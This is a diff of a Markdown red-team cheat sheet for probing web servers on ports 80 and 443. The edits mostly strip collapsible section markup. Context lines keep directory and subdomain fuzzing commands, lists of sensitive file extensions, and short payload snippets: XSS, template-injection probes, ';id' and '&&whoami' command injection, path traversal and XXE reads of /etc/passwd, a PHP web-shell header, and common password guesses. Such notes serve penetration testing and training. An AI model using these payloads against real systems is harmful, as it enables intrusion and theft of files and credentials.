@@ -1,8 +1,5 @@
 ---
 title: 80,443 HTTP/HTTPS
-parent: Services
-grand_parent: Red Team
-nav_order: 80
 ---
 # HTTP / HTTPS
 
@@ -117,8 +114,7 @@ cewl http://192.168.155.145 -e -n -w email.txt
 ## Important Files by Web Server
 
 
-<details markdown="1">
-<summary>PHP (Apache / nginx + PHP-FPM)</summary>
+PHP (Apache / nginx + PHP-FPM)
 
 ### Extension Explanation
 
@@ -135,10 +131,8 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.sqlite3`          | SQLite databases                   |
 | `.log`              | Log files                          |
 
-</details>
 
-<details markdown="1">
-<summary>ASP.NET / IIS</summary>
+ASP.NET / IIS
 
 ### Extension Explanation
 
@@ -154,10 +148,7 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.cs`     | C# source                   |
 | `.vb`     | VB.NET source               |
 
-</details>
-
-<details markdown="1">
-<summary>Java (Tomcat / Spring / JBoss)</summary>
+Java (Tomcat / Spring / JBoss)
 
 ### Extension Explanation
 
@@ -172,10 +163,7 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.xml` | Application configuration |
 | `.jar` | Java libraries |
 
-</details>
-
-<details markdown="1">
-<summary>Python (Django / Flask)</summary>
+Python (Django / Flask)
 
 ### Extension Explanation
 
@@ -189,11 +177,8 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.cfg/.ini` | Configuration files |
 | `.env` | Environment secrets |
 
-</details>
 
-<details markdown="1">
-
-<summary>Node.js / Express</summary>
+Node.js / Express
 
 ### Extension Explanation
 
@@ -206,10 +191,7 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.env` | Environment secrets |
 | `package-lock.json` | Dependency metadata |
 
-</details>
-
-<details markdown="1">
-<summary>Ruby on Rails</summary>
+Ruby on Rails
 
 ### Extension Explanation
 
@@ -221,10 +203,8 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.yml/.yaml` | Rails configuration files |
 | `database.yml` | Database credentials/configuration |
 
-</details>
 
-<details markdown="1">
-<summary>Go Web Applications</summary>
+Go Web Applications
 
 ### Extension Explanation
 
@@ -236,10 +216,7 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `.yaml/.yml` | Service configuration |
 | `.env` | Environment secrets |
 
-</details>
-
-<details markdown="1">
-<summary>Generic Sensitive Extensions</summary>
+Generic Sensitive Extensions
 
 ### Extension Explanation
 
@@ -254,10 +231,7 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `~` | Editor backup files |
 | `.zip/.tar/.gz/.7z` | Archive files |
 
-</details>
-
-<details markdown="1">
-<summary>Generic Sensitive FIlenames</summary>
+Generic Sensitive FIlenames
 
 ### Filename Explanation
 
@@ -271,13 +245,10 @@ cewl http://192.168.155.145 -e -n -w email.txt
 | `backup.zip` | Archived backups |
 | `db.sql` | Database dumps |
 
-</details>
-
 ---
 ## Enumeration Tools
 
-<details markdown="1">
-<summary>feroxbuster</summary>
+
 ## feroxbuster
 
 ```zsh
@@ -312,11 +283,6 @@ feroxbuster -u http://target.local --dont-scan admin uploads backup
 ```
 - --dont-scan
 
-</details>
-
-
-<details markdown="1">
-<summary>ffuf</summary>
 ## ffuf
 
 ```zsh
@@ -350,11 +316,6 @@ Option	Description
 - -o	Output file
 - -of json	Output format
 
-</details>
-
-
-<details markdown="1">
-<summary>gobuster</summary>
 ## gobuster
 
 ```zsh
@@ -382,10 +343,6 @@ Option	Description
 - -b 403,404	Exclude HTTP 403,404 responses
 - -o	Output file
 
-</details>
-
-<details markdown="1">
-<summary>dirb</summary>
 ## dirb
 
 ```zsh
@@ -401,11 +358,6 @@ Option	Description
 
 DIRB performs recursive scanning by default.
 
-</details>
-
-
-<details markdown="1">
-<summary>dirbuster</summary>
 ## DirBuster
 
 Recommended Configuration (GUI)
@@ -423,14 +375,11 @@ Setting	Value
 Source:
 https://github.com/danielmiessler/SecLists?utm_source=chatgpt.com
 
-</details>
+
 
 ---
 
 # Subdomain & VHOST Discovery
-
-<details markdown="1">
-<summary>feroxbuster</summary>
 
 ## feroxbuster
 
@@ -448,10 +397,7 @@ for:
 DNS subdomain enumeration
 Virtual host discovery
 
-</details>
 
-<details markdown="1">
-<summary>ffuf</summary>
 ## ffuf
 ### Subdomain Discovery
 
@@ -502,10 +448,6 @@ Option	Description
 - -rate 50	Rate limit requests
 - -t 25	Concurrent threads
 
-</details>
-
-<details markdown="1">
-<summary>gobuster</summary>
 ## gobuster
 
 ### Subdomain Discovery
@@ -552,14 +494,14 @@ Option	Description
 - --append-domain	Append base domain automatically
 - -o	Output file
 
-</details>
+
 
 ---
 
 # Parameter Discovery
 
-<details markdown="1">
-<summary>ffuf</summary>
+
+ffuf
 
 ```zsh
 ffuf -u 'http://192.168.11.21/test.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 80
@@ -570,15 +512,11 @@ ffuf -u 'http://192.168.11.21/test.php?FUZZ=test' -w /usr/share/wordlists/seclis
 
 👉 Find hidden parameters
 
-</details>
+
 
 ---
 
 # CMS-Specific
-
-
-<details markdown="1">
-<summary>WordPress</summary>
 
 ### WordPress
 #### [2_wpscan](2_wpscan.md)
@@ -618,8 +556,6 @@ joomscan -u http://localhost/
 droopescan scan drupal -u http://192.168.0.101
 ```
 
-</details>
-
 ---
 
 # *Attack*
@@ -631,7 +567,7 @@ droopescan scan drupal -u http://192.168.0.101
 ---
 
 
-<details markdown="1"><summary>URL Parameters</summary>
+URL Parameters
 
 ## Examples
 
@@ -682,10 +618,10 @@ droopescan scan drupal -u http://192.168.0.101
 ```html
 <script>alert(1)</script>
 ```
-</details>
+
 
 ---
-<details markdown="1"><summary>検索フォーム</summary>
+検索フォーム
 ## Example
 
 ```html
@@ -720,10 +656,10 @@ ${7*7}
 ;id
 &&whoami
 ```
-</details>
+
 
 ---
-<details markdown="1"><summary>ログインフォーム</summary>
+ログインフォーム
 
 ## Example
 
@@ -755,10 +691,10 @@ Summer2025!
 Winter2025!
 CompanyName123!
 ```
-</details>
+
 
 ---
-<details markdown="1"><summary>File Upload</summary>
+File Upload
 ## Example
 
 ```html
@@ -791,11 +727,11 @@ ImageMagick
 ExifTool
 GraphicsMagick
 ```
-</details>
+
 
 ---
 
-<details markdown="1"><summary>File Download</summary>
+File Download
 
 ## Example
 
@@ -816,11 +752,11 @@ download.php?file=
 ```text
 ../../../../windows/win.ini
 ```
-</details>
+
 
 ---
 
-<details markdown="1"><summary>URL Paths</summary>
+URL Paths
 ## Examples
 
 ```http
@@ -842,11 +778,11 @@ download.php?file=
 ```text
 ../../../etc/passwd
 ```
-</details>
+
 
 ---
 
-<details markdown="1"><summary>XML Input</summary>
+XML Input
 
 ## Example
 
@@ -861,11 +797,11 @@ download.php?file=
 ```xml
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ```
-</details>
+
 
 ---
 
-<details markdown="1"><summary>JSON APIs</summary>
+JSON APIs
 
 ## Example
 
@@ -900,11 +836,11 @@ download.php?file=
   "name": "{{7*7}}"
 }
 ```
-</details>
+
 
 ---
 
-<details markdown="1"><summary>HTTP Headers</summary>
+HTTP Headers
 
 ## Common Headers
 
@@ -946,11 +882,11 @@ User-Agent: {{7*7}}
 ```http
 User-Agent: <?php system($_GET['cmd']); ?>
 ```
-</details>
+
 
 ---
 
-<details markdown="1"><summary>Cookies</summary>
+Cookies
 ## Example
 
 ```http
@@ -976,7 +912,7 @@ Serialized Objects
 PHP Serialization
 Java Serialization
 ```
-</details>
+
 
 ---
 ## Credentials Found?
